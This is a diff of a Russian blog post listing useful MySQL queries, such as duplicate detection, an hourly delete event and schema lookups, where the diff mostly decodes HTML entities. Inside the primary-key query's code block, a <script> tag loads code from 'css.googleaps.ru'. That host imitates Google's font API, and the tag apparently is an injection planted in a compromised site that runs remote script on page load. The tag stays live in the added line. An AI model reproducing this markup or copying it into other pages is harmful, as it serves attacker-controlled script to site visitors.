@@ -25,52 +25,52 @@ tags:
 comments: []
 ---
 <p>В этой статье собраны некоторые, на мой взгляд, интересные и полезные запросы в MySQL. Список будет пополняться в будущем.<a id="more"></a><a id="more-62"></a></p>
-<h2>Выбор записей с повторяющимся значением поля N раз. Замените в запросе N на конкретное число.<&#47;h2></p>
+<h2>Выбор записей с повторяющимся значением поля N раз. Замените в запросе N на конкретное число.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT *<br />
 FROM `table_name`<br />
 GROUP BY `column_name`<br />
-HAVING COUNT(*) = N;<&#47;pre></p>
-<h2>Событие, которое срабатывает 1 раз в час и удаляет записи из таблицы.<&#47;h2></p>
+HAVING COUNT(*) = N;</pre></p>
+<h2>Событие, которое срабатывает 1 раз в час и удаляет записи из таблицы.</h2></p>
 <pre class="brush: sql; gutter: true">SET GLOBAL `event_scheduler` = ON;<br />
  CREATE EVENT `hourly_event`<br />
  ON SCHEDULE EVERY 1 HOUR<br />
  DO<br />
- DELETE FROM `table_name`;<&#47;pre></p>
-<h2>Получение название поля, которое является первичным ключом в таблице.<&#47;h2></p>
+ DELETE FROM `table_name`;</pre></p>
+<h2>Получение название поля, которое является первичным ключом в таблице.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT `COLUMN_NAME`<br />
  FROM `information_schema`.`COLUMNS`<br />
  WHERE `TABLE_NAME` = &#039;table_name&#039;<br />
- AND `COLUMN_KEY` = &#039;PRI&#039;;<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
-<h2>Получение размера баз данных MySQL.<&#47;h2></p>
+ AND `COLUMN_KEY` = &#039;PRI&#039;;<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre></p>
+<h2>Получение размера баз данных MySQL.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT `table_schema` AS `Db name`,<br />
- ROUND(SUM(`data_length` + `index_length`) &#47; 1024 &#47; 1024, 3) AS &#039;Db size(MB)&#039;<br />
+ ROUND(SUM(`data_length` + `index_length`) / 1024 / 1024, 3) AS &#039;Db size(MB)&#039;<br />
  FROM `information_schema`.`tables`<br />
- GROUP BY `table_schema`;<&#47;pre></p>
-<h2>Получение одной случайной записи.<&#47;h2></p>
+ GROUP BY `table_schema`;</pre></p>
+<h2>Получение одной случайной записи.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT *<br />
  FROM `table_name`<br />
  ORDER BY RAND()<br />
- LIMIT 1;<&#47;pre></p>
-<h2>Получение записей с повторяющимися значениями поля и количества повторений.<&#47;h2></p>
+ LIMIT 1;</pre></p>
+<h2>Получение записей с повторяющимися значениями поля и количества повторений.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT `column_name`, COUNT(`column_name`) AS `count`<br />
  FROM `table_name`<br />
  GROUP BY `column_name`<br />
- HAVING `count` > 1;<&#47;pre></p>
-<h2>Поиск двух обратных слэшей. Запрос найдет все записи, в которых присутствует "\".<&#47;h2></p>
+ HAVING `count` > 1;</pre></p>
+<h2>Поиск двух обратных слэшей. Запрос найдет все записи, в которых присутствует "\".</h2></p>
 <pre class="brush: sql; gutter: true">SELECT *<br />
  FROM `table_name`<br />
  WHERE `column_name`<br />
- LIKE &#039;%\\\\%&#039;;<&#47;pre></p>
-<h2>Данный запрос сгруппирует все записи по `column_name` с максимальной датой для текущего значения.<&#47;h2></p>
+ LIKE &#039;%\\\\%&#039;;</pre></p>
+<h2>Данный запрос сгруппирует все записи по `column_name` с максимальной датой для текущего значения.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT *<br />
  FROM `table_name` AS `t1`<br />
  WHERE `column_date` =<br />
- (SELECT MAX(`column_date`) FROM `table_name` AS `t2` WHERE `t1`.`column_name` = `t2`.`column_name`);<&#47;pre></p>
-<h2>Выборка информации о внешних ключах таблицы.<&#47;h2></p>
+ (SELECT MAX(`column_date`) FROM `table_name` AS `t2` WHERE `t1`.`column_name` = `t2`.`column_name`);</pre></p>
+<h2>Выборка информации о внешних ключах таблицы.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT `COLUMN_NAME`, `CONSTRAINT_NAME`, `REFERENCED_TABLE_NAME`, `REFERENCED_COLUMN_NAME`<br />
  FROM `information_schema`.`KEY_COLUMN_USAGE`<br />
  WHERE `TABLE_NAME` = &#039;table_name&#039;<br />
- AND `CONSTRAINT_NAME` <> &#039;PRIMARY&#039;;<&#47;pre></p>
-<h2>Определение количества слов в столбце.<&#47;h2></p>
+ AND `CONSTRAINT_NAME` <> &#039;PRIMARY&#039;;</pre></p>
+<h2>Определение количества слов в столбце.</h2></p>
 <pre class="brush: sql; gutter: true">SELECT LENGTH(`column_name`) - LENGTH(REPLACE(`column_name`, &#039; &#039;, &#039;&#039;)) + 1 AS `words_count`<br />
- FROM `table_name`;<&#47;pre></p>
+ FROM `table_name`;</pre></p>
